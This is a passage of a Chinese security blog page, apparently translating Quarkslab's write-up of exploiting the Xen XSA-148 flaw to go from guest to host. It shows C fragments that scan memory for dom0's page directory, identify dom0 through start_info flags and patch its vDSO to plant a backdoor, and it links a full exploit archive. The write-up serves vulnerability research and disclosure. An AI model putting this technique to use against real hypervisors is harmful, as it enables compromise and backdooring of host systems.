+&nbsp;*&nbsp;&nbsp;0x0000010000000000&nbsp;-&nbsp;0x00007fffffffffff&nbsp;[127TB,&nbsp;2^46&nbsp;bytes,&nbsp;PML4:2-255]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Reserved&nbsp;for&nbsp;future&nbsp;use.
+&nbsp;*/</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">如你接下来要看到的,每个半虚拟化客户机都有一些与 Xen 有关的表映射到其自身的虚拟内存:机器地址到物理地址转换表,Xen 代码等。这些映射对每一个客户机而言都是一样的,我们可以尝试寻找物理页,它在于客户机相同的偏移处具有相同的值。同时,由于 dom0 使用的是半虚拟化 Linux 内核,偏移 510 和 511 不应被置为0(0xFFFFFFFF……地址)。这也是我们正在做的,以找到一个潜在的页目录:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">for(page=0;&nbsp;page&lt;MAX_MFN;&nbsp;page++)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dump_page_buff(page,&nbsp;buff);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(current_tab[261]&nbsp;==&nbsp;my_pgd[261]&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_tab[262]&nbsp;==&nbsp;my_pgd[262]&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_tab[511]&nbsp;!=&nbsp;0&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_tab[510]&nbsp;!=&nbsp;0&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__mfn(my_pgd)&nbsp;!=&nbsp;page)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">有一个潜在的页目录是不够的,我们要肯定的它是 dom0 的页目录。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">解决方案就在 start_info 结构中。这种结构会在 Xen 启动时自动映射在每个半虚拟化客户机(包括 dom0)的虚拟地址空间,且包含一些有用的信息:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">struct&nbsp;start_info&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;magic[32];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;&quot;xen-&lt;version&gt;-&lt;platform&gt;&quot;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;&nbsp;&nbsp;uint32_t&nbsp;flags;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;SIF_xxx&nbsp;flags.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;...
+};</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">你可以看到,start_info 结构起始处有个魔数,包含标记字段。我们只需要解析整个页目录对应的页开始处的魔数:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">int&nbsp;is_startup_info_page(char&nbsp;*page_data)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;ret&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;marker[]&nbsp;=&nbsp;&quot;xen-3.0-x86&quot;;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(memcmp(page_data,&nbsp;marker,&nbsp;sizeof(marker)-1)&nbsp;==&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ret;
+}</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">可以通过检查 SIF_INITDOMAIN 标志是否设置来判断页目录是否属于 dom0。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">for(page=0;&nbsp;page&lt;MAX_MFN;&nbsp;page++)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dump_page_buff(page,&nbsp;buff);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(current_tab[261]&nbsp;==&nbsp;my_pgd[261]&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_tab[262]&nbsp;==&nbsp;my_pgd[262]&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_tab[511]&nbsp;!=&nbsp;0&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_tab[510]&nbsp;!=&nbsp;0&nbsp;&amp;&amp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__mfn(my_pgd)&nbsp;!=&nbsp;page)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;find_start_info_into_L4(page,&nbsp;(pgd_t*)&nbsp;buff);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(tmp&nbsp;!=&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;we&nbsp;find&nbsp;a&nbsp;valid&nbsp;start_info&nbsp;page
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEBUG(&quot;start_info&nbsp;page&nbsp;:&nbsp;0x%x&quot;,&nbsp;tmp);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dump_page_buff(tmp,&nbsp;buff);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(start_f-&gt;flags&nbsp;&amp;&nbsp;SIF_INITDOMAIN)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEBUG(&quot;dom0!&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEBUG(&quot;not&nbsp;dom0&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">这样,我们可以如同 scumjr 的 SMM后门[5]一样,在 dom0 的 vDSO 中设置后门了。在他的博文中说,vDSO 库由 Linux 内核映射到每个用户进程,很容易发现它。因此,我们只需要解析一次页目录,搜索 vDSO 并给它植入一个后门。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">if(start_f-&gt;flags&nbsp;&amp;&nbsp;SIF_INITDOMAIN)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEBUG(&quot;dom0!&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dump_page_buff(page,&nbsp;buff);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;find_vdso_into_L4(page,&nbsp;(pgd_t*)&nbsp;buff);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(tmp&nbsp;!=&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEBUG(&quot;dom0&nbsp;vdso&nbsp;:&nbsp;0x%x&quot;,&nbsp;tmp);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;patch_vdso(tmp);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEBUG(&quot;patch.&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">演示:</span><a href="https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho</span></a> </p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">完整利用:</span><a href="http://blog.quarkslab.com/resources/2016-07-12_xsa-148/code/xsa148_exploit.tar.gz" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://blog.quarkslab.com/resources/2016-07-12_xsa-148/code/xsa148_exploit.tar.gz</span></a> </p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><strong><br/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; color: rgb(0, 112, 192);"><strong>结论</strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">这个可能是 Xen 有史以来最严重的漏洞,它在被发现前已经存在了7年。如本文所述,利用它来实现 dom0 内代码执行并不难。可以做比修补 vDSO 更多的事,如栾尚聪选择的是超级调用页。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">原来这第二部分应该是最后一篇……但我们最近发现了一个新的漏洞可以让客户机逃逸。相关公告已经在昨天公开披露(XSA-182[9],CVE-2016-6258[10]),下篇我们将介绍如何编写一个完整的利用。敬请关注!</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[1]&nbsp;&nbsp;&nbsp; (1, 2) </span><a href="http://xenbits.xen.org/xsa/advisory-148.html" _src="http://xenbits.xen.org/xsa/advisory-148.html" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://xenbits.xen.org/xsa/advisory-148.html</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[2]&nbsp;&nbsp;&nbsp; </span><a href="http://download.intel.com/design/processor/manuals/253668.pdf" _src="http://download.intel.com/design/processor/manuals/253668.pdf" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://download.intel.com/design/processor/manuals/253668.pdf</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[3]&nbsp;&nbsp;&nbsp; </span><a href="http://wiki.xen.org/wiki/X86_Paravirtualised_Memory_Management" _src="http://wiki.xen.org/wiki/X86_Paravirtualised_Memory_Management" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://wiki.xen.org/wiki/X86_Paravirtualised_Memory_Management</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[4]&nbsp;&nbsp;&nbsp; </span><a href="https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-022-2015.txt" _src="https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-022-2015.txt" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-022-2015.txt</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[5]&nbsp;&nbsp;&nbsp; </span><a href="https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/" _src="https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[6]&nbsp;&nbsp;&nbsp; (1, 2) </span><a href="https://conference.hitb.org/hitbsecconf2016ams/sessions/advanced-exploitation-xen-hypervisor-vm-escape/" _src="https://conference.hitb.org/hitbsecconf2016ams/sessions/advanced-exploitation-xen-hypervisor-vm-escape/" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">https://conference.hitb.org/hitbsecconf2016ams/sessions/advanced-exploitation-xen-hypervisor-vm-escape/</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[7]&nbsp;&nbsp;&nbsp; </span><a href="https://www.blackhat.com/us-16/briefings.html#ouroboros-tearing-xen-hypervisor-with-the-snake" _src="https://www.blackhat.com/us-16/briefings.html#ouroboros-tearing-xen-hypervisor-with-the-snake" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">https://www.blackhat.com/us-16/briefings.html#ouroboros-tearing-xen-hypervisor-with-the-snake</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[8]&nbsp;&nbsp;&nbsp; </span><a href="http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html" _src="http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[9]&nbsp;&nbsp;&nbsp; </span><a href="http://xenbits.xen.org/xsa/advisory-182.html" _src="http://xenbits.xen.org/xsa/advisory-182.html" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://xenbits.xen.org/xsa/advisory-182.html</span></a></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">[10]&nbsp; </span><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6258" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6258</span></a></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/2932.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="Xen攻击第二篇：XSA-148--从guest到host - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="2932" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
